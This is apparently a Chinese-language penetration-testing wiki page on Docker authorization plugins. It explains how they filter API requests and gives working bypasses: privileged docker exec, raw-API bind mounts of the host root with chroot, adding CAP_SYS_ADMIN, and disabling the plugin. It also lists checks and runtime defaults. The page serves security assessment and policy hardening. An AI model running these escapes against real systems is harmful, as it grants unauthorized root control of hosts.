# 运行时授权插件

{{#include ../../../banners/hacktricks-training.md}}

## 概述

运行时授权插件是额外的策略层，用于决定调用方是否可以执行特定的 daemon 操作。Docker 是经典示例。默认情况下，任何能够与 Docker daemon 通信的用户，实际上都可以对其进行广泛控制。Authorization plugins 会检查经过身份验证的用户以及请求的 API 操作，然后根据策略允许或拒绝请求，从而尝试收紧这一模型。

这一主题值得单独成页，因为当攻击者已经能够访问 Docker API 或属于 `docker` 组的用户时，它会改变 exploitation 模型。在此类环境中，问题不再只是“我能否访问 daemon？”，还包括“daemon 是否被授权层限制？如果是，该层能否通过未处理的 endpoint、薄弱的 JSON 解析或 plugin 管理权限绕过？”

## 工作原理

当请求到达 Docker daemon 时，授权子系统可以将请求上下文传递给一个或多个已安装的 plugin。plugin 可以看到经过身份验证的用户身份、请求详情、选定的 headers，以及请求或响应 body 的部分内容（当 content type 合适时）。多个 plugin 可以串联，只有在所有 plugin 都允许请求时，访问才会被授予。

这种模型听起来很强，但其安全性完全取决于策略编写者对 API 的理解是否全面。如果 plugin 会阻止 `docker run --privileged`，却忽略 `docker exec`，遗漏顶层 `Binds` 等备用 JSON key，或允许 plugin 管理操作，就可能造成限制已经生效的假象，同时仍然留下直接的 privilege-escalation 路径。

## 常见 Plugin 目标

策略审查的重要区域包括：

- container 创建 endpoint
- `HostConfig` 字段，例如 `Binds`、`Mounts`、`Privileged`、`CapAdd`、`PidMode` 以及 namespace 共享选项
- `docker exec` 行为
- plugin 管理 endpoint
- 任何可以间接触发策略模型预期范围之外 runtime 操作的 endpoint

从历史上看，Twistlock 的 `authz` plugin 以及 `authobot` 等简单的教学 plugin，使这一模型更容易研究，因为它们的策略文件和代码路径展示了 endpoint 到 action 的实际映射方式。对于 assessment 工作而言，重要的经验是：策略编写者必须理解完整的 API surface，而不能只关注最明显的 CLI 命令。

## 滥用

首先要了解实际被阻止的内容。如果 daemon 拒绝某个操作，错误信息通常会 leak plugin 名称，这有助于识别正在使用的控制机制：
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
如果需要更广泛的 endpoint profiling，`docker_auth_profiler` 等工具会很有用，因为它们能够自动完成原本需要重复执行的任务：检查插件实际允许哪些 API 路由和 JSON 结构。

如果环境使用自定义插件，并且你可以与 API 交互，请枚举实际会被过滤的对象字段：
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
这些检查很重要，因为许多 authorization 失败是特定于字段的，而不是特定于概念的。某个插件可能会拒绝某种 CLI 模式，却没有完全阻止等效的 API 结构。

### 完整示例：`docker exec` 在容器创建后添加权限

一种阻止 privileged 容器创建、但允许创建 unconfined 容器并使用 `docker exec` 的策略，仍可能被绕过：
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
如果 daemon 接受第二步，用户就重新获得了一个位于 container 内的 privileged interactive process，而 policy author 原本认为该 process 已受到限制。

### 完整示例：通过 Raw API 使用 Bind Mount

某些存在缺陷的 policy 只检查一种 JSON 结构。如果 root filesystem 的 bind mount 未被一致阻止，仍然可以挂载 host：
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
同样的概念也可能出现在 `HostConfig` 下：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
影响是完全逃逸到主机文件系统。值得注意的是，这种 bypass 源于策略覆盖不完整，而不是 kernel bug。

### 完整示例：未检查的 Capability 属性

如果策略忘记过滤与 Capability 相关的属性，攻击者可能创建一个重新获得危险 Capability 的容器：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
一旦存在 `CAP_SYS_ADMIN` 或类似的强大 capability，[capabilities.md](protections/capabilities.md) 和 [privileged-containers.md](privileged-containers.md) 中描述的许多 breakout 技术便可被使用。

### 完整示例：禁用 Plugin

如果允许执行 plugin-management 操作，最干净的 bypass 可能是完全关闭该控制：
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
这是控制平面层面的策略失效。授权层虽然存在，但原本应受其限制的用户仍然保留禁用它的权限。

## Checks

这些命令旨在确定是否存在策略层，以及该策略层看起来是完整的还是仅停留于表面。
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
这里的有趣之处：

- 包含 plugin 名称的拒绝消息可以确认存在授权层，并且通常会暴露具体实现。
- 攻击者可见的 plugin 列表可能足以发现是否可以执行 disable 或 reconfigure 操作。
- 如果策略只阻止明显的 CLI 操作，却不阻止原始 API 请求，在证明其不可绕过之前，都应将其视为可绕过。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 默认未启用 | 除非配置了 authorization plugin，否则 Daemon 访问实际上是全有或全无 | 不完整的 plugin 策略、使用黑名单而非 allowlist、允许 plugin 管理、字段级盲点 |
| Podman | 没有常见的直接等价机制 | Podman 通常更多依赖 Unix 权限、rootless 执行以及 API 暴露决策，而不是 Docker 风格的 authz plugin | 广泛暴露 rootful Podman API、socket 权限薄弱 |
| containerd / CRI-O | 不同的控制模型 | 这些 Runtime 通常依赖 socket 权限、节点信任边界以及更高层的 orchestrator 控制，而不是 Docker authz plugin | 将 socket 挂载到 workloads 中、薄弱的节点本地信任假设 |
| Kubernetes | 在 API-server 和 kubelet 层使用 authn/authz，而不是 Docker authz plugin | Cluster RBAC 和 admission controls 是主要策略层 | 过于宽泛的 RBAC、薄弱的 admission policy、直接暴露 kubelet 或 Runtime API |

{{#include ../../../banners/hacktricks-training.md}}
